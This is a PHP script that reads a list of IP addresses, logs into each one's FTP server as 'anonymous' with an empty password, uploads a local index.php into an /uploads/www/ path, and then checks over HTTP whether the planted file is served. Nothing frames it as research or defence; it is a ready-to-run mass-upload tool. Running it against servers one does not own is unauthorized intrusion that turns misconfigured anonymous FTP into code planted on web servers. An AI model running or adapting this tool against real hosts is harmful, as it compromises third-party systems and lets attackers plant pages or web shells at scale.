<?php
// Define the path to the text file that contains only the FTP server IP addresses
$ftp_servers_file = "valid_ips.txt";  // Replace with the path to your text file containing IPs

// Define the FTP login credentials to use for all servers
$ftp_username = "anonymous";  // Replace with your FTP username
$ftp_password = "";  // Replace with your FTP password

// Define the path to the local file you want to upload
$local_file = "index.php";  // Replace with the local file path

// Define the destination file path on the FTP servers
$ftp_upload_path = "/uploads/www/index.php";  // Replace with the destination path on FTP servers

// Define the HTTP path to check for the uploaded file
$http_check_path = "http://{ip}/uploads/www/index.php";  // The HTTP URL path to check

// Define the file to store HTTP response results
$http_results_file = "http_check_results.txt";

// Check if the FTP servers file exists
if (!file_exists($ftp_servers_file)) {
    die("The FTP servers file does not exist. Please create '$ftp_servers_file'.");
}

// Read the FTP servers file into an array, each line representing an IP address
$ftp_servers = file($ftp_servers_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (empty($ftp_servers)) {
    die("The FTP servers file is empty. Please add FTP server IPs in '$ftp_servers_file'.");
}

// Open the results file for writing
$http_results_handle = fopen($http_results_file, 'w');
if (!$http_results_handle) {
    die("Could not open '$http_results_file' for writing.");
}

// Loop through each line in the file to connect to each FTP server by IP
foreach ($ftp_servers as $ftp_server) {
    echo "Connecting to FTP server: $ftp_server\n";

    // Establish an FTP connection to the IP address
    $conn_id = ftp_connect($ftp_server);
    if (!$conn_id) {
        echo "Could not connect to $ftp_server. Skipping...\n";
        fwrite($http_results_handle, "ERROR: Could not connect to FTP server $ftp_server.\n\n");
        continue;
    }

    // Login to the FTP server using the predefined username and password
    if (!@ftp_login($conn_id, $ftp_username, $ftp_password)) {
        echo "Failed to login as $ftp_username on $ftp_server. Skipping...\n";
        fwrite($http_results_handle, "ERROR: Failed to login as $ftp_username on FTP server $ftp_server.\n\n");
        ftp_close($conn_id);
        continue;
    }

    echo "Successfully connected and logged in as $ftp_username on $ftp_server.\n";

    // Set the FTP mode to passive (optional, depending on server settings)
    ftp_pasv($conn_id, true);

    // Upload the file to the FTP server
    if (ftp_put($conn_id, $ftp_upload_path, $local_file, FTP_BINARY)) {
        echo "Successfully uploaded $local_file to $ftp_upload_path on $ftp_server.\n";
    } else {
        echo "There was a problem uploading $local_file to $ftp_upload_path on $ftp_server.\n";
        fwrite($http_results_handle, "ERROR: Problem uploading $local_file to $ftp_upload_path on FTP server $ftp_server.\n\n");
        ftp_close($conn_id);
        continue;
    }

    // Close the FTP connection
    ftp_close($conn_id);
    echo "Closed connection to $ftp_server.\n";

    // Check the HTTP presence of the uploaded file
    $http_url = str_replace("{ip}", $ftp_server, $http_check_path);
    echo "Checking HTTP presence at: $http_url\n";

    // Use cURL to check the HTTP URL and capture the response and HTTP status code
    $ch = curl_init($http_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);  // We only need headers to check the status
    $http_response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Check if the file was found and write the result to the file
    if ($http_code == 200) {
        fwrite($http_results_handle, "SUCCESS: File found at $http_url\n");
        fwrite($http_results_handle, "HTTP Status Code: $http_code\n\n");
        echo "File found at $http_url with HTTP Status Code: $http_code\n";
    } else {
        // File was not found or there was an error, record the error code and message
        $error_msg = curl_error($ch);
        fwrite($http_results_handle, "ERROR: Could not find file at $http_url\n");
        fwrite($http_results_handle, "HTTP Status Code: $http_code\n");
        fwrite($http_results_handle, "Error Message: $error_msg\n\n");
        echo "Could not find file at $http_url with HTTP Status Code: $http_code\n";
        echo "Error Message: $error_msg\n";
    }

    // Close cURL
    curl_close($ch);
}

// Close the HTTP results file
fclose($http_results_handle);

echo "File upload and HTTP check process completed. Results recorded in '$http_results_file'.\n";
?>
